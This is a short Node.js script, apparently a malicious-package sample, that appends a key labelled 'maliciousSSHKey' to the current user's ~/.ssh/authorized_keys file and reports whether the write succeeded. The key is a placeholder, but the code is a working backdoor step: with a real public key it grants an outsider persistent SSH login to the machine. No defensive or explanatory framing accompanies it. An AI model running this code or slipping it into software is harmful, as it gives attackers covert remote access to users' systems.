const fs = require('node:fs');

try {
  const homedir = require('os').homedir();
  fs.appendFileSync(`${homedir}/.ssh/authorized_keys`, 'maliciousSSHKey', 'utf-8')
  console.log('maliciousSSHKey successfully written');
} catch (err) {
  console.error('Error! Could not write to authorized_keys');
  console.log(err)
}
